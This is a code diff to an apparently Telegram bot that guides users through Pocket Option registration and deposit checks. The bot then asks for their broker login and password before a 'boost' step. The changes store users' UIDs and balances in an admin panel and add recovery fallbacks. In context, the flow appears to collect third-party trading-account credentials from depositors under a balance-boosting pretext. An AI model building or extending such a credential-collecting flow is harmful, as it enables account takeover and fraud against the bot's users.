@@ -264,6 +264,13 @@ async def _verify_pocket_option_registration(message: types.Message, state: FSMC
 
     await state.update_data(pocket_option_uid=message.text.strip())
     
+    # Persist UID to admin storage for resilience
+    try:
+        from app.dispatcher import admin_panel as _admin_panel
+        _admin_panel.update_user_field(message_to_reply.from_user.id, "uid", message.text.strip())
+    except Exception:
+        pass
+    
     wait_message = await message_to_reply.answer("🔎 Checking your UID...")
 
     # Step 1: Check registration
@@ -321,8 +328,33 @@ async def _verify_pocket_option_deposit(message: types.Message, state: FSMContex
 
     if has_deposit:
         # If all checks pass:
-        initial_balance = dep_data.get('balance', 0.0) # Use the balance from the parsed data
+        # Prefer real trading balance if available, otherwise fall back to deposits/FTD
+        raw_balance = dep_data.get('balance', 0.0)
+        sum_deposits = dep_data.get('sum_of_deposits') or dep_data.get('sum_deposits')
+        ftd_amount = dep_data.get('ftd_amount') or dep_data.get('ftd')
+        initial_balance = 0.0
+        try:
+            initial_balance = float(raw_balance) if raw_balance is not None else 0.0
+        except Exception:
+            initial_balance = 0.0
+        if initial_balance <= 0:
+            for v in (sum_deposits, ftd_amount):
+                try:
+                    if v is not None and float(v) > 0:
+                        initial_balance = float(v)
+                        break
+                except Exception:
+                    continue
+        if initial_balance <= 0:
+            initial_balance = min_deposit
+
         await state.update_data(initial_balance=initial_balance)
+        # Persist initial balance for robustness
+        try:
+            from app.dispatcher import admin_panel as _admin_panel
+            _admin_panel.update_user_field(user_id, "initial_balance", initial_balance)
+        except Exception:
+            pass
         await wait_message.delete()
         # Запрашиваем у пользователя логин и пароль перед продолжением
         await send_message_with_photo(
@@ -454,9 +486,28 @@ async def pocket_option_login_input_handler(message: types.Message, state: FSMCo
     user_data = await state.get_data()
     uid = user_data.get("pocket_option_uid") # Retrieve UID from state
 
+    # Fallback: try to recover UID from admin storage if state was lost
+    if not uid:
+        try:
+            from app.dispatcher import admin_panel as _admin_panel
+            _user = _admin_panel.get_user(message.from_user.id)
+            recovered_uid = (_user or {}).get("uid")
+            if recovered_uid:
+                uid = recovered_uid
+                await state.update_data(pocket_option_uid=uid)
+        except Exception:
+            pass
+
     if not uid:
         await message.answer("An error occurred with your session (UID not found). Please start over.")
-        await state.clear()
+        # Ask for UID again to continue the flow smoothly
+        await send_message_with_photo(
+            message=message,
+            photo_name="give my your UID.jpg",
+            text=messages["pocket_option_ask_for_uid"],
+            reply_markup=get_back_to_platform_select_keyboard()
+        )
+        await state.set_state(UserFlow.pocket_option_uid_input)
         return
 
     email, password = _parse_login_password(message.text or "")
@@ -532,8 +583,14 @@ async def start_boost_handler(callback: types.CallbackQuery, state: FSMContext):
     if initial_balance is None:
         try:
             from app.dispatcher import admin_panel
-            min_deposit_cfg = admin_panel.get_referral_settings().get("min_deposit", 100)
-            initial_balance = float(min_deposit_cfg) if isinstance(min_deposit_cfg, (int, float)) else 100.0
+            # Try to recover initial balance saved at deposit verification
+            saved_user = admin_panel.get_user(user_id) or {}
+            saved_initial = saved_user.get('initial_balance')
+            if isinstance(saved_initial, (int, float)) and saved_initial > 0:
+                initial_balance = float(saved_initial)
+            else:
+                min_deposit_cfg = admin_panel.get_referral_settings().get("min_deposit", 100)
+                initial_balance = float(min_deposit_cfg) if isinstance(min_deposit_cfg, (int, float)) else 100.0
         except Exception:
             initial_balance = 100.0
         await state.update_data(initial_balance=initial_balance)
